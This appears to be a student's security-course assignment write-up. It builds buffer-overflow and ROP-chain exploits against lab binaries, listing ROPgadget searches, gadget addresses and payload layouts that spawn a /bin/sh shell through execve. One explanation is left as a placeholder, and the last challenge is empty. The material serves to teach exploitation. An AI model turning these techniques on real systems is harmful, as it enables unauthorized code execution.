# assignment 5

Luigi Cussigh
2023148006

## challege 0

i generated characters to pad the stack frame with 'A's till we get to the return address. then i appended characters
that overwrite the return address with \x50\x11\x40\x00\x00\x00\x00\x00\x0a which is the address of a function that calls
execve("/bin/sh", NULL, NULL)

## challenge 1

there's a null terminated string "/bin/sh" at address 0x402004:

``` plaintext
Contents of section .rodata:
 402000 01000200 2f62696e 2f736800 25730025  ..../bin/sh.%s.%
 402010 700a005b 52455355 4c545d20 4e6f7420  p..[RESULT] Not 
 402020 6578706c 6f697465 64203a28 20457869  exploited :( Exi
 402030 74696e67 20736166 656c792e 0a00456e  ting safely...En
 402040 74657220 69643a00 456e7465 72207061  ter id:.Enter pa
 402050 7373776f 72643a00                    ssword:.        
```

using ROPgadget we find a syscall gadget:

ROPgadget --binary ./exploitme | grep syscall

0x000000000040134c : syscall

also we need to set rdi, rsi, rdx, rax using pop gadgets

ROPgadget --binary ./exploitme | grep pop (register)

rdi:
(no pop for rdi, we'll have to get creative..)

rsi:
0x00000000004015e9 : pop rsi ; ret

rdx:
0x00000000004012e8 : pop rdx ; ret

rax:
(no pop for rax, we'll have to get creative..)

since we dont have rdi and rax pops (the most important ones...) we'll have to substitute:

ROPgadget --binary ./exploitme | grep "mov rdi"

rdi: // compound_gadget_0
0x0000000000401363 : mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall

rax:
0x0000000000401230 : mov rax, rsi ; ret

we can run:

pop rsi // store 59 (0x3b) on higher address
mov rax, rsi; ret
pop rsi // store pointer to /bin/sh on higher address
mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall // the xor's set the registers to 0 which is we want to do anyway

{} - ranges of random bytes
() - words that need to be reversed byte by byte

we'll just pass the first function:
"0A"{272 - 2 bytes of random stuff}(00000000004015e9)(000000000000003b)(0000000000401230)(00000000004015e9)(0000000000402004)(0000000000401363)'\n'
  |        |                                           |                                                     |
  |        compensate for "0A"                         value of rax                                          address to "/bin/sh"
  to escape strtol

## challenge 2

the decompiled code of the main program looks somehting like this:

we can see that the while loop just executes every function pointer if its not null in the array that starts at v3-1024
also v3-1024 is written to in vuln_overflow. we can write gadget addresses to the v3-1024 buffer to manipulate the program.

we will again use ROP gadgets to achieve the execution of syscall with rax = 59
let's find some stuff that will do at least something related to 59 or 0x3b

ROPgadget --binary ./exploitme-safestack | grep "0x3b"

we see a lot of gadgets but particularly interesting is:

0x0000000000402bd0 : add rax, 0x3b ; ret

it's very clean and it does almost what we need. we just need to find somehting to set rax to zero before executing this gadget

ROPgadget --binary ./exploitme | grep "rax"

we see:

0x0000000000402b90 : xor rax, rax ; ret

this gadget sets rax to 0. in combination with the previous gadget we can pass the execve syscall number to rax

now let's see what gadgets there are for the syscall instruction:

ROPgadget --binary ./exploitme-safestack | grep "syscall"

0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall

we see the same compound gadget from the last challenge. we'll use it to actually perform the syscall

we need to load the address of the c-string /bin/sh to rdi. we notice that the functions:

0x0000000000402b10 <g_sh@@Base>:
0x0000000000402b10 <g_sh2@@Base>:
0x0000000000402b10 <g_sh3@@Base>:

all do that.

``` asm
402f00: 49 ff c4              inc    r12
402f03: 49 81 fc 80 00 00 00  cmp    r12,0x80
402f0a: 74 1e                 je     402f2a <main@@Base+0x7a>
402f0c: 4b 83 bc e7 00 fc ff  cmp    QWORD PTR [r15+r12*8-0x400],0x0
402f13: ff 00 
402f15: 74 e9                 je     402f00 <main@@Base+0x50>
402f17: 48 89 de              mov    rsi,rbx
402f1a: 43 ff 94 e7 00 fc ff  call   QWORD PTR [r15+r12*8-0x400]
402f21: ff 
402f22: 48 89 df              mov    rdi,rbx
402f25: 48 89 c3              mov    rbx,rax
402f28: eb d6                 jmp    402f00 <main@@Base+0x50>
```

(explanation why id needs to be 16 to write at r15 in main's unsafe stack)

having found all of the gadgets, we can proceed to compile our payload.

the id should just get the number 16, so we will just pass it:

b"16A"

this way, the second gets will start to write in the previous unsafe stack frame.

0x0000000000402b90 : xor rax, rax ; ret
0x0000000000402bd0 : add rax, 0x3b ; ret
0x0000000000402b40 : mov rdx, rax ; ret
0x0000000000402b10 : mov into rax the address of "/bin/sh"
0x0000000000402b70 : mov rax, rdx ; ret
0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall

## challenge 3
